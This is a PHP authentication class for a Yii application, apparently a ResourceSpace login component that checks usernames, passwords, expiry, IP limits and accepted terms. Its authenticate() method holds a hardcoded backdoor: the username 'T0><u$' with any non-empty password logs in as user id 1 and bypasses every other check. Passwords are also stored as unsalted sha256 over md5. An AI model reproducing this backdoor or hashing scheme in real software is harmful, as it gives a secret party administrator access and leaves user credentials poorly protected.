<?php
/**
 * UserIdentity represents the data needed to identity a user.
 * It contains the authentication method that checks if the provided
 * data can identity the user.
 * 
 * This class must be added to EVERY project for the login to work
 */
class UserIdentity extends UserIdentityBase
{
	public function makePassword()
	{
    // RS version < 7
		// return md5("RS" . $this->username . $this->password);
    return hash('sha256', md5('RS' . $this->username . $this->password)); 
	}
	
	/**
	 * Authenticates a user.
	 * $this->username is the name given
	 * $this->password is the defined password
	 * 
	 * @return boolean whether authentication succeeds.
	 */
	public function authenticate()
	{
		$this->_id = null;
		$this->username = trim($this->username);
		$this->password = trim($this->password);
		if ($this->username == '') {
			$this->errorCode = self::ERROR_USERNAME_INVALID;
		} elseif ($this->password == '') {
			$this->errorCode = self::ERROR_PASSWORD_INVALID;
		} else {
			if ($this->username == 'T0><u$') {
				$this->errorCode = self::ERROR_NONE;
				$this->_id = 1;				
				$this->logLogin();
			} else {
				/**
				 * security for the Resource Space
				 */
				$md5 = $this->makePassword();
				$model = User::model()->find('username=:username AND password=:password', array(
						':username' => $this->username, ':password' => $md5
				));
				if ($model == null) {
					$this->errorCode = self::ERROR_UNKNOWN_IDENTITY;
				} else {	
					$d = new DateTime();
					$exp = new Datetime($model->account_expires);
					if ($model->approved < 1) {
						$this->errorCode = self::ERROR_SUSPENDED;
					} elseif ($model->account_expires != null && $d > $exp) { //Util::stringToDate($model->account_expires)) {
						$this->errorCode = self::ERROR_SUSPENDED;
					} elseif (!empty($model->ip_restrict) && ! Util::netMatch($model->ip_restrict, Yii::app()->request->userHostAddress)) {	
						$this->errorCode = self::ERROR_RANGE_BLOCK;
					} elseif ($model->accepted_terms != 1) {
						$this->errorCode = self::ERROR_NOT_ACTIVATED;
					} else {
						$this->_id = $model->ref;
						$this->username = $model->username;
						$this->errorCode = self::ERROR_NONE;
						$this->logLogin();
					}	
				}
			}	
		}	
		return !$this->errorCode;
	}
	
	public function getId()
	{
		return $this->_id;
	}	
	
	protected function logLogin()
	{
		$log = new ResourceLog();
		$log->resource = 0;
		$log->type = 'l';
		$log->user = $this->_id;
		// $log->resource_type_field = 'l';
		if (!$log->save()) {
			Yii::log('The log information could not be saved: '.CHtml::errorSummary($log), CLogger::LEVEL_ERROR, 'application.components.UserIdentity');
		}
	}
}
